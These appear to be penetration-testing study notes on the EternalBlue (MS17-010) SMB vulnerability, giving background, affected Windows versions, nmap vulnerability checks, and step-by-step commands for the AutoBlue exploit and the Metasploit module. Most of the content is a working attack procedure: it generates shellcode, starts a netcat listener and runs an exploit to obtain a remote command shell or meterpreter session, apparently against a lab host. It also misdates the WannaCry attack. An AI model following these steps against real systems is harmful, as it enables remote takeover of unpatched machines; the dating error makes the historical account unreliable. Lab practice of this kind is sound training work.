#### Exploiting Windows MS17-010 SMB Vulnerability( Eternal Blue)
- EternalBlue (MS17-010/CVE-2017-0144) is the name given to a collection of Windows vulnerability and exploits that allow attacker to remotely execute arbitrary code and gain access to a Windows system and consequently the network that the target system is a part of.
- The EternalBlue exploit was developed by the NSA(National Security Agency) to take advantages of the MS17-010 vulnerability and was leaked to the public by a hacker group called the Shadow Brokers in 2017
- The EternalBlue exploit takes advantages of a vulnerability in the Windows SMBv1 protocol that allows attackers to send specially crafted packets that consequently facilitate the execution of arbitrary commands.
- The EternalBlue exploit was used in the WannaCry ransomware attack on June 27,2017 ot exploit other Windows systems across networks with the objective of spreading the ransomware to as many systems as possible.
##### The vulnerability affects multiple version of windows
- Windows Vista
- Windows 7
- Windows Server 2008
- Windows 8.1
- Windows Server 2012
- Windows 10
- Windows server 2016
  
#### Exploit Process
- The EternalBlue exploit has a MSF auxiliary module that can be used to check if a target system if vulnerable to the exploit and also has an exploit module that can be used to exploit the vulnerability on unpatched systems
- The EternalBlue exploit module can be used to exploit vulnerable windows systems and consequently provide us with a privileged meterpreter sessions on the target system
- In addition to MSF modules,we can also manually exploit the vulnerability by utilizing publicly available exploit code.
#### Lab environment
- sudo nmap -sV -p 445 -O 10.10.10.12 [ this confirm the smb and windows server is running or not]
- sudo nmap -sV -P 445 --script=smb-vuln-ms17-010 10.10.10.1 [ this script ensures if the target is vulnerable for eternalblue or not]
  
#### AutoBlue exploit
- git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git
- cd AutoBlue-MS17-010
- pip install -r requirements.txt 
- cd  shellcode
- chmod +x shell_prep.sh
- ./shell_prep.sh
- this script need to set different permissions,lhost,lport,etc
- this will generate two files in current directory [sc_x64_msf.bin,sc_x86_msf.bin]
- nc -nlvp 1234 [ start listener in new terminal new tab,port must be same when generating shell]
- chmod +x eternalblue_exploit8.py [give executable permissions]
- python eternalblue_exploit8.py 10.10.10.12 shellcode/sc_x64.bin
- this will give us a cmd prompt in listener terminal

#### msf module
- search eternalblue
- use exploit/windows/smb/ms17_010_eternalblue
- set everything requires
- run
- this give us meterpreter session


